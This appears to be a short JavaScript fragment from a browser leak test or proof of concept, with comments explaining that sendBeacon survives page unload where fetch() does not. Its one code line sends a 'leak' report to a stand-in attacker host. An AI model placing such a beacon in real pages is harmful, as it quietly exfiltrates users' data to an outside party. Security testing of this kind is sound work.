// sendBeacon survives page unload — fetch() loses reports when the scenario
// navigates away (e.g. blob: tab closed immediately after open).
navigator.sendBeacon("https://attacker.com/report/report?leak=fetch");
